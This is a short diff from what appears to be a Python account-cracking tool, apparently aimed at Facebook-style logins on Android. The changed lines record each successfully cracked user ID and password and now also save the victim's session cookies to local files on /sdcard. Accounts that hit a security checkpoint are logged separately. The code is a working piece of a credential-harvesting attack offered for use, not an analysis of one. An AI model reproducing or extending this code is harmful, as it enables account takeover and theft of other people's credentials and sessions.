@@ -287,14 +287,14 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ')                
-                open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+coki+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;196m〔᚛GS XD-CP〔᚛᚜〕 ' +uid+ '|' +ps+ '  \33[0;97m')
-                open('/sdcard/GS XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\033[1;35m〔᚛GS XD-CP〔᚛᚜〕 ' +uid+ '|' +ps+ '  \033[1;35m')
+                open('/sdcard/GS XD RANDOM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
